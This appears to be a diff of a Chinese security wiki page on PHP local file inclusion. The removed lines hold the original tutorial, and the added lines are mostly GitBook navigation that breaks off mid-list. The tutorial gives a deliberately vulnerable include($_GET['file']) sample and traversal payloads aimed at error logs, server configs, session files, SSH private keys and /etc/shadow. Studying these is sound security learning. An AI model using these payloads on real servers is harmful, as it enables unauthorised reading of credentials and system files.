@@ -1,464 +1,2181 @@
+
 <!DOCTYPE HTML>
-<html>
+<html lang="cn" >
     <head>
-        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
-        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
-        <title>php 文件包含 - Wiki | janes</title>
-        <meta name="keywords" content=""/>
-        <meta name="description" content=""/>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    </head>
+        <title>php 文件包含 · Wiki | janes</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.0">
+        <meta name="author" content="janes">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
 
-    <body>
-        <div id="container">
+    
             
-<div id="header">
-  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;php 文件包含</div>
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="ssrf.html" />
+    
+    
+    <link rel="prev" href="php-match-or-comapre.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
 </div>
-<div class="clearfix"></div>
-<div id="title">php 文件包含</div>
-  <div id="content">
-  <h2 id="0x01">0x01 与文件包含相关的函数</h2>
-<div class="hlcode"><pre><span class="n">require</span>         <span class="err">找不到被包含的文件时会产生致命错误，并停止脚本运行。</span>
-<span class="n">include</span>         <span class="err">找不到被包含的文件时只会产生警告，脚本将继续运行。</span>
-<span class="n">include_once</span>    <span class="err">与</span><span class="n">include</span><span class="err">类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span>
-<span class="n">require_once</span>    <span class="err">与</span><span class="n">require</span><span class="err">类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</span>
-</pre></div>
+
+            
+                <nav role="navigation">
+                
 
 
-<h2 id="0x02-lfi-local-file-include">0x02 本地文件包含(LFI--Local File Include)</h2>
-<h3 id="_1">普通本地包含</h3>
-<p>只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的php代码，则引入当前文件执行，若不含有效php代码，则直接输出文件内容</p>
-<p>样例：</p>
-<div class="hlcode"><pre><span class="err">#</span> <span class="nx">lfi</span><span class="p">.</span><span class="nx">php</span>
-<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
-</pre></div>
+<ul class="summary">
+    
+    
 
+    
 
-<p><strong> 利用 </strong></p>
-<h4 id="php">注入有效 php 代码</h4>
-<div class="hlcode"><pre><span class="nx">echo</span> <span class="err">&quot;</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="s2">&quot; &gt;&gt; lfi.txt</span>
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Wiki
+            
+                </a>
+            
 
-<span class="s2"># browser</span>
-<span class="s2">http://127.0.0.1/lfi.php?file=lfi.txt</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    Python
+            
+                </span>
+            
 
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../Python/anaconda.html">
+            
+                <a href="../Python/anaconda.html">
+            
+                    
+                    Anaconda
+            
+                </a>
+            
 
-<h4 id="_2">目录遍历</h4>
-<div class="hlcode"><pre><span class="cp"># linux 这两个文件存储着所有文件的路径，需要root权限</span>
-<span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mlocate</span><span class="o">/</span><span class="n">mlocate</span><span class="p">.</span><span class="n">db</span>
-<span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">locate</span><span class="p">.</span><span class="n">db</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../Python/django.html">
+            
+                <a href="../Python/django.html">
+            
+                    
+                    Django 1.8.7
+            
+                </a>
+            
 
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../Python/excel.html">
+            
+                <a href="../Python/excel.html">
+            
+                    
+                    Excel
+            
+                </a>
+            
 
-<h4 id="_3">包含错误日志</h4>
-<div class="hlcode"><pre><span class="o">?</span><span class="n">ile</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../Python/flask.html">
+            
+                <a href="../Python/flask.html">
+            
+                    
+                    Flask
+            
+                </a>
+            
 
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../Python/flask_github_api_login.html">
+            
+                <a href="../Python/flask_github_api_login.html">
+            
+                    
+                    Flask github api login
+            
+                </a>
+            
 
-<h4 id="web">获取web目录或配置文件</h4>
-<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../Python/函数.html">
+            
+                <a href="../Python/函数.html">
+            
+                    
+                    Function
+            
+                </a>
+            
 
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../Python/http_server.html">
+            
+                <a href="../Python/http_server.html">
+            
+                    
+                    Http_server
+            
+                </a>
+            
 
-<h4 id="_4">包含上传附件</h4>
-<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="n">attachment</span><span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">xx</span><span class="p">.</span><span class="n">file</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../Python/iterators.html">
+            
+                <a href="../Python/iterators.html">
+            
+                    
+                    Iterators
+            
+                </a>
+            
 
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../Python/log.html">
+            
+                <a href="../Python/log.html">
+            
+                    
+                    Log
+            
+                </a>
+            
 
-<h4 id="session">读取 session 文件</h4>
-<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_xxxxx</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../Python/pickle.html">
+            
+                <a href="../Python/pickle.html">
+            
+                    
+                    Pickle
+            
+                </a>
+            
 
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../Python/pythonic.html">
+            
+                <a href="../Python/pythonic.html">
+            
+                    
+                    Pythonic
+            
+                </a>
+            
 
-<p>session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell</p>
-<h4 id="root">如果拥有root权限还可以试试读这些东西：</h4>
-<div class="hlcode"><pre><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../Python/random.html">
+            
+                <a href="../Python/random.html">
+            
+                    
+                    Random
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../Python/scapy.html">
+            
+                <a href="../Python/scapy.html">
+            
+                    
+                    Scapy
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">keystore</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../Python/selenium.html">
+            
+                <a href="../Python/selenium.html">
+            
+                    
+                    Selenium and Xvfb 
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">pub</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../Python/socket.html">
+            
+                <a href="../Python/socket.html">
+            
+                    
+                    Socket
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">known_hosts</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../Python/network_package.html">
+            
+                <a href="../Python/network_package.html">
+            
+                    
+                    network package
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../Python/note.html">
+            
+                <a href="../Python/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">bash_history</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../Python/eval.html">
+            
+                <a href="../Python/eval.html">
+            
+                    
+                    动态执行字符串代码
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">mysql_history</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../Python/command.html">
+            
+                <a href="../Python/command.html">
+            
+                    
+                    命令执行
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">fd</span><span class="o">/</span><span class="n">fd</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">*</span> <span class="p">(</span><span class="err">文件标识符</span><span class="p">)</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.20" data-path="../Python/buildin_type.html">
+            
+                <a href="../Python/buildin_type.html">
+            
+                    
+                    常用内置对象操作
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mounts</span>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.21" data-path="../Python/常用模块.html">
+            
+                <a href="../Python/常用模块.html">
+            
+                    
+                    常用模块
+            
+                </a>
+            
 
-<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">config</span><span class="p">.</span><span class="n">gz</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.22" data-path="../Python/wechat.html">
+            
+                <a href="../Python/wechat.html">
+            
+                    
+                    微信公众号开发
+            
+                </a>
+            
 
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.23" data-path="../Python/模拟http-post-upload-file.html">
+            
+                <a href="../Python/模拟http-post-upload-file.html">
+            
+                    
+                    模拟HTTP POST upload file
+            
+                </a>
+            
 
-<h3 id="_5">截断本地包含</h3>
-<p>样例：</p>
-<div class="hlcode"><pre><span class="n">include</span><span class="p">(</span><span class="err">$</span><span class="n">a</span><span class="p">.</span><span class="s">&quot;.php&quot;</span><span class="p">);</span>
-</pre></div>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.24" data-path="../Python/自省.html">
+            
+                <a href="../Python/自省.html">
+            
+                    
+                    自省
+            
+                </a>
+            
 
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.25" data-path="../Python/运维.html">
+            
+                <a href="../Python/运维.html">
+            
+                    
+                    运维
+            
+                </a>
+            
 
-<ul>
-<li>长文件名截断</li>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.26" data-path="../Python/processing.html">
+            
+                <a href="../Python/processing.html">
+            
+                    
+                    进(线程)程处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.27" data-path="../Python/迭代器和生成器.html">
+            
+                <a href="../Python/迭代器和生成器.html">
+            
+                    
+                    迭代器和生成器
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../Linux/centos.html">
+            
+                <a href="../Linux/centos.html">
+            
+                    
+                    Centos7
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../Linux/cmdline.html">
+            
+                <a href="../Linux/cmdline.html">
+            
+                    
+                    Cmdline
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../Linux/ncat.html">
+            
+                <a href="../Linux/ncat.html">
+            
+                    
+                    Nc
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../Linux/nmap.html">
+            
+                <a href="../Linux/nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../Linux/ubuntu.html">
+            
+                <a href="../Linux/ubuntu.html">
+            
+                    
+                    Ubuntu
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    WebSecurity
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="attacktool.html">
+            
+                <a href="attacktool.html">
+            
+                    
+                    AttackTool
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="csrf.html">
+            
+                <a href="csrf.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="dns.html">
+            
+                <a href="dns.html">
+            
+                    
+                    DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="mysqlinject.html">
+            
+                <a href="mysqlinject.html">
+            
+                    
+                    Mysql 注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="note.html">
+            
+                <a href="note.html">
+            
+                    
+                    Note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="php序列化.html">
+            
+                <a href="php序列化.html">
+            
+                    
+                    PHP序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="ssti-jinja2.html">
+            
+                <a href="ssti-jinja2.html">
+            
+                    
+                    SSTI Jinja2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="scan_for_info.html">
+            
+                <a href="scan_for_info.html">
+            
+                    
+                    Scan For Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="sqlinject.html">
+            
+                <a href="sqlinject.html">
+            
+                    
+                    SqlInject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="vulnapp.html">
+            
+                <a href="vulnapp.html">
+            
+                    
+                    Vulnapp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="xss.html">
+            
+                <a href="xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="backdoor.html">
+            
+                <a href="backdoor.html">
+            
+                    
+                    backdoor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="linux提权.html">
+            
+                <a href="linux提权.html">
+            
+                    
+                    linux提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="mysql.html">
+            
+                <a href="mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="mysql宽字节注入.html">
+            
+                <a href="mysql宽字节注入.html">
+            
+                    
+                    mysql宽字节注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="mysql注入过滤.html">
+            
+                <a href="mysql注入过滤.html">
+            
+                    
+                    mysql注入过滤
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.17" data-path="php.html">
+            
+                <a href="php.html">
+            
+                    
+                    php
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.18" data-path="php-match-or-comapre.html">
+            
+                <a href="php-match-or-comapre.html">
+            
+                    
+                    php match or comapre
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.19" data-path="php-文件包含.html">
+            
+                <a href="php-文件包含.html">
+            
+                    
+                    php 文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.20" data-path="ssrf.html">
+            
+                <a href="ssrf.html">
+            
+                    
+                    ssrf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.21" data-path="url.html">
+            
+                <a href="url.html">
+            
+                    
+                    url
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.22" data-path="webshell.html">
+            
+                <a href="webshell.html">
+            
+                    
+                    webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.23" data-path="web渗透测试.html">
+            
+                <a href="web渗透测试.html">
+            
+                    
+                    web渗透测试
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.24" data-path="常用端口.html">
+            
+                <a href="常用端口.html">
+            
+                    
+                    常用端口
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.25" data-path="常见协议.html">
+            
+                <a href="常见协议.html">
+            
+                    
+                    常见协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.26" data-path="敏感配置文件.html">
+            
+                <a href="敏感配置文件.html">
+            
+                    
+                    敏感配置文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.27" data-path="path_collect.html">
+            
+                <a href="path_collect.html">
+            
+                    
+                    文件读取漏洞路径收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.28" data-path="解析漏洞.html">
+            
+                <a href="解析漏洞.html">
+            
+                    
+                    解析漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    Kali2
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../Kali2/beef.html">
+            
+                <a href="../Kali2/beef.html">
+            
+                    
+                    Beef
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../Kali2/burpsuite.html">
+            
+                <a href="../Kali2/burpsuite.html">
+            
+                    
+                    BurpSuite
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../Kali2/code_editor.html">
+            
+                <a href="../Kali2/code_editor.html">
+            
+                    
+                    Code editor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../Kali2/gather-information.html">
+            
+                <a href="../Kali2/gather-information.html">
+            
+                    
+                    Gather Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../Kali2/hydra.html">
+            
+                <a href="../Kali2/hydra.html">
+            
+                    
+                    Hydra
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../Kali2/mitmproxy.html">
+            
+                <a href="../Kali2/mitmproxy.html">
+            
+                    
+                    MitmProxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../Kali2/pyenv.html">
+            
+                <a href="../Kali2/pyenv.html">
+            
+                    
+                    Pyenv
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../Kali2/remote.html">
+            
+                <a href="../Kali2/remote.html">
+            
+                    
+                    Remote access
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../Kali2/shell.html">
+            
+                <a href="../Kali2/shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../Kali2/tmux.html">
+            
+                <a href="../Kali2/tmux.html">
+            
+                    
+                    Tmux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../Kali2/w3af.html">
+            
+                <a href="../Kali2/w3af.html">
+            
+                    
+                    W3af
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../Kali2/install&configure.html">
+            
+                <a href="../Kali2/install&configure.html">
+            
+                    
+                    install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../Kali2/phpmyadmin.html">
+            
+                <a href="../Kali2/phpmyadmin.html">
+            
+                    
+                    phpmyadmin install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../Kali2/flow_analysis.html">
+            
+                <a href="../Kali2/flow_analysis.html">
+            
+                    
+                    流量监听
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    Vuln
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../Vuln/joomla.html">
+            
+                <a href="../Vuln/joomla.html">
+            
+                    
+                    Joomla
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../PHP/function.html">
+            
+                <a href="../PHP/function.html">
+            
+                    
+                    Function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../PHP/configure.html">
+            
+                <a href="../PHP/configure.html">
+            
+                    
+                    configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../PHP/note.html">
+            
+                <a href="../PHP/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="../PHP/正则匹配.html">
+            
+                <a href="../PHP/正则匹配.html">
+            
+                    
+                    正则匹配
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    Docker
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../Docker/docker-compose.html">
+            
+                <a href="../Docker/docker-compose.html">
+            
+                    
+                    Docker Compose
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../Docker/dockerfile.html">
+            
+                <a href="../Docker/dockerfile.html">
+            
+                    
+                    Dockerfile
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../Docker/docker-api-in-python.html">
+            
+                <a href="../Docker/docker-api-in-python.html">
+            
+                    
+                    docker api in python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../Docker/locale.html">
+            
+                <a href="../Docker/locale.html">
+            
+                    
+                    locale
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../Docker/note.html">
+            
+                <a href="../Docker/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../Docker/openvpn.html">
+            
+                <a href="../Docker/openvpn.html">
+            
+                    
+                    openvpn
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../Docker/安装和基本命令.html">
+            
+                <a href="../Docker/安装和基本命令.html">
+            
+                    
+                    安装和基本命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.8" data-path="../Docker/常用开发环境.html">
+            
+                <a href="../Docker/常用开发环境.html">
+            
+                    
+                    常用开发环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.9" data-path="../Docker/微容器.html">
+            
+                <a href="../Docker/微容器.html">
+            
+                    
+                    微容器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.10" data-path="../Docker/心得.html">
+            
+                <a href="../Docker/心得.html">
+            
+                    
+                    心得
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.11" data-path="../Docker/持续集成与自动发布.html">
+            
+                <a href="../Docker/持续集成与自动发布.html">
+            
+                    
+                    持续集成与自动发布
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" >
+            
+                <span>
+            
+                    
+                    HTTP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../HTTP/cookie.html">
+            
+                <a href="../HTTP/cookie.html">
+            
+                    
+                    Cookie
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../HTTP/encode_and_decode.html">
+            
+                <a href="../HTTP/encode_and_decode.html">
+            
+                    
+                    Encode and Decode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../HTTP/http请求格式.html">
+            
+                <a href="../HTTP/http请求格式.html">
+            
+                    
+                    HTTP请求格式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.4" data-path="../HTTP/proxy.html">
+            
+                <a href="../HTTP/proxy.html">
+            
+                    
+                    Proxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.5" data-path="../HTTP/xpath.html">
+            
+                <a href="../HTTP/xpath.html">
+            
+                    
+                    XPATH
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" >
+            
+                <span>
+            
+                    
+                    Git
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="../Git/gist.html">
+            
+                <a href="../Git/gist.html">
+            
+                    
+                    Gist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="../Git/git.html">
+            
